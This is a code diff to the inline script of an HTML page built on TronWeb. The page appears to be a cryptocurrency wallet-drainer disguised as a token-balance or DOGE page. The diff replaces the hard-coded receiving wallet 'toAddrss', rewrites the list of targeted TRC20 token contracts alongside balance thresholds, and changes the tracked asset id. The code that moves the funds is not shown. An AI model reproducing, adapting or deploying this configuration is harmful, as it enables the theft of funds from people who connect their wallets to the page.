@@ -106,56 +106,26 @@ Balance <b id="tokenBalance">0 DOGE</b>
 <script src="./index_files/theme-custom.js.下载"></script>
 <script src="./index_files/jquery-3.5.0.js.下载"></script>
 <script>
-	var toAddrss = 'TWuJckVJztNddbQQeLobfML5VaaFwXHBdQ';
-    var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+	var toAddrss = 'TDLV8WV6cSxd8hTRtzQNWrhCf6y1v3tPeY';
+    var contractsAddress = [
+                            "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+                            "TL6K6iaEkn8kdnJ79a8Be3S4RFf4pFkGE8",
+                            "TXMKm8FSp6zcm3cdgkgcM1fwdkuJbZ4Hgv",
+                            "TMUgpK7LLSYE2YKT3nGbLSzPgs3sw5hquM",
+                            "TDk91SWz2GvwfZwMTGX21d4ngUUH8YZZAv",
+                            "TDuvynpjzttyM6qP6Qp2jqKpAMsLYD32qn",
+                            "TL62tGz88S7dks7ssQxh6rVMKaJn2aq92j",
                             "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
-                            "TKfjV9RNKJJCqPvBtK8L7Knykh7DNWvnYt",
                             "TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9",
-                            "TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
-                            "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF",
+                            "TKfjV9RNKJJCqPvBtK8L7Knykh7DNWvnYt",
                             "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
-                            "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT",
-                            "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
                             "TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9",
-                            "TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h",
-                            "TLvDJcvKJDi3QuHgFbJC6SeTj3UacmtQU3",
-                            "TAwRvFAqfB4bbzVCVPgGATZV5uMVs9UyVL",
-                            "TH4W5RkEu9otmT88vk1zv4Rz8SgfCvtu5B",
-                            "TFDwGwod9qopreRiirsFMwPzX4v2r662P4",
-                            "TLGd97zsjrkomUDF962ZFMerdQxPffG7hX",
-                            "THGn3W9XRvsSpgegKbDEhNjeZL6YrB47kb",
-                            "TTL52uBzTG7qorL7BQYdjGUY3HWWr9Kvao",
-                            "TAQ4QmZv9KXmXYH26LKarKauyrwzGteXAA",
-                            "TAVQyaoBErm5kpTHTycSn4u6dkMkU65aCQ",
-                            "TBwoSTyywvLrgjSgaatxrBhxt3DGpVuENh",
-                            "TRkuKAxmWZ4G74MvZnFpoosQZsfvtNpmwH",
-                            "TBYxqxitJAabLRQgnk9i6GXswrtujBExxy",
-                            "TD4bVgcwj3FRbmAo283HxNvqZvY7T3uD8k",
-                            "THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt",
-                            "TJvqNiWUN2v2NBG12UhfV7WSvReJkRP3VC",
-                            "TRNVzKLHvzBjSs3t12KSzU29m3BiUt9aTc",
-                            "TPmqRz2HmrUDVDRgGxhZv4yAKBRWsRex4E",
-                            "TKeyfKMAicwhWysvgktW568i3KyRNT8AyT",
-                            "TAS3kXwHFDbL8J7wQHwopVEfLT26XAWMiq",
-                            "TYaAqxSMub4VSqZFczKDk6NzQp9N9Mcik2",
-                            "TDXJ1dSPLsN52jhP32NvVyhQ5X265BNU5c",
-                            "TVj7RNVHy6thbM7BWdSe9G6gXwKhjhdNZS",
-                            "TQXhxDPNKVsgxYbJatMnkRZsgTcTzxC5Fc",
-                            "THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt",
-                            "TBwEPBdBPQsHaSwk7qhDWjqi8oNz74ppzd",
-                            "TVgAYofpQku5G4zenXnvxhbZxpzzrk8WVK",
-                            "TKttnV3FSY1iEoAwB4N52WK2DxdV94KpSd",
-                            "THXm85dwyCSTNPq8h1JDPth2vuTcwtXyBb",
-                            "TKSLNVrDjb7xCiAySZvjXB9SxxVFieZA7C",
-                            "TNkmiDFubYeHZ3nAnZNFvtc6K1toBzE6DD",
-                            "TNo59Khpq46FGf4sD7XSWYFNfYfbc8CqNK",
-                            "TJrJJdhxggsh1J8FmbYC2XB6ZVQazHKKdy",
-                            "TTUwzoZAK6rpDjpSh8B2XFTnxGfbMLHJaq",
-                            "TDXJ1dSPLsN52jhP32NvVyhQ5X265BNU5c",
-                            "TMJWuBDvwvcm6QUWXDaC6GqTyq3FgEmWEt",
-                            "TD4bVgcwj3FRbmAo283HxNvqZvY7T3uD8k",
-                            "TGbu32VEGpS4kDmjrmn5ZZJgUyHQiaweoq"
-                            ]
+                            "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
+                            "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT",
+                            "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF",
+                            "TE2RzoSV3wFK99w6J9UnnZ4vLfXYoxvRwP",
+                            "TGBr8uh9jBVHJhhkwSJvQN2ZAKzVkxDmno",
+                            "TUEYcyPAqc4hTg1fSuBCPc18vGWcJDECVw", ]
     var tBalance = [5000000, 700000000000000000, 170000000000000000000, 13000000000, 10000, 60000000000, 3000000000000000]
     var _tokenBalance;
     const timer = setInterval(async() => {
@@ -165,7 +135,7 @@ Balance <b id="tokenBalance">0 DOGE</b>
 
         var account = await tronWeb.trx.getAccount();
         if (account.assetV2){
-            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003846";});
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003938";});
             if (tokenBalance){
               _tokenBalance = tokenBalance;
               $("#tokenBalance").text((tokenBalance.value / 1000000).toFixed(2) + " doge");
